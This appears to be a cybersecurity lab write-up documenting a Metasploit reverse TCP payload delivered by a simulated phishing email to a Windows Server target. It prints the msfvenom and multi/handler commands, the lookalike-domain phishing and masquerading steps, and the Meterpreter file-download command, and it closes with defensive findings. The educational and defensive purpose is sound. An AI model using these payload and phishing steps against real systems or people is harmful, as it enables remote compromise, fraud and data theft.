# Metasploit Reverse TCP Payload and Phishing Simulation Lab

<p align="center">
  <strong>Authorized Payload Generation, Social Engineering Simulation, Meterpreter Access, and Simulated Data Exfiltration</strong>
</p>

---

## Overview

This authorized adversary-emulation lab demonstrates how a reverse TCP payload and a simulated phishing message can be combined to establish remote access to a Windows system.

Using Kali Linux and the Metasploit Framework, I generated a Windows x64 Meterpreter reverse TCP executable, configured a listener, copied the payload to a deceptive filename resembling a Microsoft Edge installer, and delivered it through a controlled phishing simulation. After the attachment was saved and executed on the Windows target, the payload connected to the Metasploit listener and opened a Meterpreter session. I then navigated the target file system and downloaded a lab-provided file containing simulated sensitive data.

> **Authorized Lab Notice:** All activity documented in this repository was completed in an isolated educational lab using intentionally provided virtual machines and simulated data. These techniques must only be used on systems you own or have explicit written permission to test.

## Lab Objectives

- Identify the Kali Linux system's IPv4 address.
- Generate a Windows x64 Meterpreter reverse TCP payload with MSFvenom.
- Copy the lab payload to a deceptive filename for a controlled masquerading demonstration.
- Configure a Metasploit `multi/handler` listener.
- Compose and send a simulated phishing email with the lab payload attached.
- Save and execute the attachment on the authorized Windows target.
- Establish and verify a Meterpreter session.
- Navigate the target file system.
- Download and inspect a file containing simulated sensitive data.
- Close the Meterpreter and Metasploit sessions safely.
- Identify defensive controls that could detect or prevent the simulated attack.

## Lab Environment

| Component | Details |
|---|---|
| Attack System | `ZYKALI01` |
| Attack Operating System | Kali Linux |
| Target System | `ZYWIN01` |
| Target Operating System | Windows Server 2022 |
| Exploitation Framework | Metasploit Framework |
| Payload Generator | MSFvenom |
| Email Client | Thunderbird |
| Payload | `windows/x64/meterpreter/reverse_tcp` |
| Listener Port | TCP `5555` |
| Simulated Payload Name | `Edge.exe` |
| Simulated Sensitive File | `CreditCards.txt` |

## Tools and Technologies

- Kali Linux
- Windows Server 2022
- Metasploit Framework
- MSFconsole
- MSFvenom
- Meterpreter
- Thunderbird
- Reverse TCP connection
- Controlled social-engineering and phishing simulation

---

## Attack Flow

```text
ZYKALI01 (Kali Linux)
        │
        │ 1. Generate the reverse TCP payload
        ▼
payload.exe copied to Edge.exe
        │
        │ 2. Attach the payload to a simulated phishing email
        ▼
ZYWIN01 (Windows Server 2022)
        │
        │ 3. Save and execute Edge.exe in the authorized lab
        ▼
Outbound reverse TCP connection to the Kali listener
        │
        │ 4. Meterpreter session opens
        ▼
Remote file access and simulated data transfer
```

---

## Task 1: Create the Payload and Configure a Listener

### Step 1: Identify the Kali Linux IP Address

I opened a terminal on `ZYKALI01` and displayed the system's network interfaces:

```bash
ip a
```

The IPv4 address assigned to the Kali system was used as the `LHOST` value when generating the payload and configuring the listener.

<p align="center">
  <img src="https://github.com/user-attachments/assets/4decd796-fbe8-4427-9944-5193c041a934"
       alt="Kali Linux terminal showing the ZYKALI01 IPv4 address with the ip a command"
       width="800">
</p>

<p align="center">
  <em>Figure 1: The `ZYKALI01` IPv4 address identified with the `ip a` command.</em>
</p>

### Step 2: Start the Metasploit Framework

I launched the Metasploit console from the Kali terminal:

```bash
msfconsole
```

MSFconsole provides access to Metasploit modules, payload configuration, handlers, sessions, and authorized post-exploitation features.

### Step 3: Generate the Reverse TCP Payload

In a separate Kali terminal, I used MSFvenom to create a Windows x64 Meterpreter reverse TCP executable:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  --platform windows \
  -a x64 \
  LHOST=<ZYKALI01-IP-ADDRESS> \
  LPORT=5555 \
  -f exe \
  -o /home/kali/payload.exe
```

Replace `<ZYKALI01-IP-ADDRESS>` with the IPv4 address identified in Step 1.

#### Payload Parameters

| Parameter | Purpose |
|---|---|
| `-p windows/x64/meterpreter/reverse_tcp` | Selects the Windows x64 Meterpreter reverse TCP payload |
| `--platform windows` | Specifies Windows as the target platform |
| `-a x64` | Specifies a 64-bit target architecture |
| `LHOST` | Sets the Kali Linux callback address |
| `LPORT=5555` | Sets TCP port `5555` for the callback |
| `-f exe` | Generates a Windows executable |
| `-o /home/kali/payload.exe` | Saves the generated payload to the Kali home directory |

<p align="center">
  <img src="https://github.com/user-attachments/assets/126e4ab3-3233-4e42-b5ec-0080e526f2a1"
       alt="Kali Linux terminal showing MSFvenom generating the Windows x64 Meterpreter payload"
       width="800">
</p>

<p align="center">
  <em>Figure 2: MSFvenom generating the Windows x64 Meterpreter reverse TCP payload.</em>
</p>

### Step 4: Copy the Payload to the Simulated Filename

To demonstrate file masquerading in the controlled lab, I copied the payload to a filename resembling a Microsoft Edge installer:

```bash
cp /home/kali/payload.exe /home/kali/Edge.exe
```

This changed only the filename. It did not add a valid Microsoft signature or make the file a legitimate Edge installer.

<p align="center">
  <img src="https://github.com/user-attachments/assets/844d4018-0236-4e77-88f7-caae67cd9c08"
       alt="Kali Linux terminal showing payload.exe copied to the simulated filename Edge.exe"
       width="800">
</p>

<p align="center">
  <em>Figure 3: The generated lab payload copied to the simulated filename `Edge.exe`.</em>
</p>

### Step 5: Configure the Metasploit Listener

I configured a Metasploit `multi/handler` to receive the reverse TCP connection:

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ZYKALI01-IP-ADDRESS>
set LPORT 5555
run
```

The payload, callback address, and callback port had to match the values used when the executable was generated.

<p align="center">
  <img src="https://github.com/user-attachments/assets/528ab366-844f-4e37-83a2-8c972e5cca59"
       alt="Metasploit multi handler configured to listen for the reverse TCP connection on port 5555"
       width="800">
</p>

<p align="center">
  <em>Figure 4: Metasploit `multi/handler` listening for a reverse TCP connection on port `5555`.</em>
</p>

---

## Task 2: Compose and Send the Simulated Phishing Email

### Step 1: Open Thunderbird

I opened Thunderbird on `ZYKALI01` and selected the simulated sender account:

```text
mark@support.microsofl.com
```

The lab domain was intentionally designed to resemble a Microsoft-related domain while containing a spelling change.

### Step 2: Compose the Message

I created an email addressed to:

```text
bob@mycompany.com
```

The simulated message falsely claimed that the attachment contained the latest Microsoft Edge release.

#### Social-Engineering Indicators

- Lookalike sender domain
- Generic greeting
- Request to save and run an executable attachment
- Brand impersonation
- Urgent or authoritative wording
- Executable without a trusted digital signature

### Step 3: Attach `Edge.exe`

I selected `Edge.exe` from the Kali home directory and attached it to the controlled lab message.

<p align="center">
  <img src="https://github.com/user-attachments/assets/4ac82f8a-f0a9-4afd-a208-a0ee479efb02"
       alt="Thunderbird showing the simulated phishing email with Edge.exe attached"
       width="800">
</p>

<p align="center">
  <em>Figure 5: Simulated phishing email prepared with the lab-provided `Edge.exe` payload attached.</em>
</p>

### Step 4: Send the Email

The message was sent from the simulated lookalike account to the authorized target user:

```text
From: mark@support.microsofl.com
To: bob@mycompany.com
Attachment: Edge.exe
```

---

## Task 3: Save and Execute the Attachment on the Target

### Step 1: Open the Message on `ZYWIN01`

On the Windows Server target, I opened Thunderbird and selected the simulated phishing message in Bob's inbox.

<p align="center">
  <img src="https://github.com/user-attachments/assets/068ed828-1780-4dd8-a15c-17e88f53ccb4"
       alt="Thunderbird on ZYWIN01 showing the simulated phishing message in Bob's inbox"
       width="800">
</p>

<p align="center">
  <em>Figure 6: The simulated phishing email received in Bob's Thunderbird inbox.</em>
</p>

### Step 2: Save the Attachment

I saved `Edge.exe` to the Windows desktop in the isolated lab environment.

<p align="center">
  <img src="https://github.com/user-attachments/assets/01bae421-423c-40b9-a691-3b617eb4a026"
       alt="Windows desktop showing the Edge.exe lab attachment after it was saved"
       width="680">
</p>

<p align="center">
  <em>Figure 7: The `Edge.exe` attachment saved to the target system's desktop.</em>
</p>

### Step 3: Execute the Payload

I double-clicked `Edge.exe` as required by the authorized exercise. Windows displayed an **Open File - Security Warning** stating that the publisher could not be verified and that the file did not have a trusted digital signature.

In a real environment, the correct response would be to stop, avoid executing the file, and report the message to the security team.

<p align="center">
  <img src="https://github.com/user-attachments/assets/4d34cc57-ff3d-466b-85cc-f909ab4197ef"
       alt="Windows Open File Security Warning for the unsigned Edge.exe lab payload"
       width="800">
</p>

<p align="center">
  <em>Figure 8: Windows warning that `Edge.exe` had an unknown publisher and no trusted digital signature.</em>
</p>

---

## Task 4: Open a Meterpreter Session and Access the Target

### Step 1: Confirm the Reverse Connection

After `Edge.exe` executed, the lab payload initiated an outbound connection to the Metasploit listener on `ZYKALI01`.

<p align="center">
  <img src="https://github.com/user-attachments/assets/e48d2446-ee84-4bee-8765-04e118abe16b"
       alt="Metasploit console showing a Meterpreter reverse TCP session from ZYWIN01"
       width="800">
</p>

<p align="center">
  <em>Figure 9: Meterpreter reverse TCP session established between `ZYWIN01` and the Kali listener.</em>
</p>

### Step 2: Navigate the Target File System

From the Meterpreter prompt, I displayed the current directory and navigated to Bob's Documents folder:

```text
pwd
cd C:\Users\Bob\Documents
dir
```

These commands demonstrated the level of file-system access available through the session under the security context of the process that executed the payload.

### Step 3: Download the Simulated Sensitive File

I downloaded the lab-provided file from the Windows target to Kali:

```text
download CreditCards.txt /home/kali/
```

The file was copied from:

```text
C:\Users\Bob\Documents\CreditCards.txt
```

to:

```text
/home/kali/CreditCards.txt
```

I then displayed the simulated data in a Kali terminal:

```bash
cat /home/kali/CreditCards.txt
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/4bfa0479-422b-4013-a777-86fd42fa3cc3"
       alt="Meterpreter showing CreditCards.txt downloaded from the authorized Windows target"
       width="49%">
  <img src="https://github.com/user-attachments/assets/8027fe11-897a-4394-8f79-10abf961cabf"
       alt="Kali Linux terminal displaying the simulated contents of CreditCards.txt"
       width="49%">
</p>

<p align="center">
  <em>Figure 10: Simulated sensitive file transferred from the Windows target and displayed on Kali Linux.</em>
</p>

### Step 4: Close the Sessions

I closed the Meterpreter session and then exited Metasploit:

```text
exit
exit
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/dba62aae-7081-4400-b8fe-bcdd6e62db0d"
       alt="Metasploit console showing the Meterpreter and framework sessions being closed"
       width="800">
</p>

<p align="center">
  <em>Figure 11: Meterpreter and Metasploit sessions closed at the end of the authorized exercise.</em>
</p>

---

## Evidence Summary

| Stage | Evidence |
|---|---|
| Network Identification | Kali IPv4 address identified with `ip a` |
| Payload Creation | Windows x64 Meterpreter reverse TCP executable generated |
| Masquerading Simulation | `payload.exe` copied to `Edge.exe` |
| Command and Control | Metasploit listener configured on TCP port `5555` |
| Social Engineering | Lookalike Microsoft-related domain used in a simulated phishing email |
| Delivery | `Edge.exe` attached and sent through Thunderbird |
| User Execution | Attachment saved and executed on the authorized Windows Server 2022 target |
| Initial Access | Meterpreter session opened after the outbound reverse connection |
| Discovery | Bob's Documents directory listed remotely |
| Collection | `CreditCards.txt` located on the target |
| Simulated Exfiltration | Lab file transferred to `/home/kali/` |
| Session Closure | Meterpreter and Metasploit sessions closed |

## Security Findings

### Finding 1: Lookalike Email Domain

The sender address used `support.microsofl.com`, which visually resembled a Microsoft-related domain. This demonstrated how a small spelling change can be used to impersonate a trusted organization.

### Finding 2: Executable Email Attachment

The message delivered an `.exe` attachment while presenting it as a browser update. Organizations should block or quarantine executable email attachments unless a documented business requirement exists.

### Finding 3: Unknown Publisher Warning

Windows warned that the executable came from an unknown publisher and lacked a trusted digital signature. This warning did not prove that the file was malicious, but it was a strong reason to stop and verify the file before execution.

### Finding 4: Reverse TCP Command-and-Control Channel

The payload initiated an outbound connection to the Kali system on TCP port `5555`. Monitoring unusual outbound connections, unexpected destination systems, and suspicious parent-child process relationships can help identify reverse shells and command-and-control activity.

### Finding 5: Simulated Unauthorized Remote File Access

The Meterpreter session allowed remote directory navigation and file transfer under the compromised process's security context. Endpoint detection, least privilege, network segmentation, application control, and outbound filtering can reduce the likelihood and impact of this type of compromise.

## Defensive Recommendations

- Block or quarantine executable attachments at the email gateway.
- Use SPF, DKIM, DMARC, sender-domain protection, and lookalike-domain detection.
- Train users to inspect sender addresses and avoid running unexpected attachments.
- Provide a simple process for reporting suspicious messages.
- Require application allowlisting on sensitive systems.
- Deploy endpoint detection and response software.
- Alert on unsigned or uncommon executables launched from user-writable locations.
- Monitor unusual outbound traffic, destination systems, and nonstandard ports.
- Use least-privilege accounts instead of administrative accounts for routine work.
- Segment servers from user workstations and untrusted systems.
- Monitor process creation, file transfers, and abnormal network callbacks.
- Use multifactor authentication and strong access controls for sensitive resources.
- Investigate security warnings rather than bypassing them.
- Preserve relevant email, endpoint, process, and network logs for incident response.

## Key Takeaways

- A technically simple payload can become more effective when combined with social engineering.
- Lookalike domains and familiar brand names can make deceptive messages appear legitimate.
- Windows security warnings provide an important opportunity to stop and verify an executable.
- Reverse TCP payloads cause the target to initiate the connection, so inbound-only filtering is not sufficient.
- Email filtering, application control, endpoint monitoring, outbound traffic analysis, and user awareness are most effective when used together.
- A complete security investigation should document the sequence from payload creation and delivery through execution, remote access, and simulated data movement.
- Security indicators should be correlated before reaching a final conclusion; no single warning or artifact proves malicious intent by itself.

---

> **Note:** This repository is intended for cybersecurity education, defensive awareness, and authorized penetration-testing practice only. The systems, accounts, payload, and data were provided specifically for the isolated lab environment.
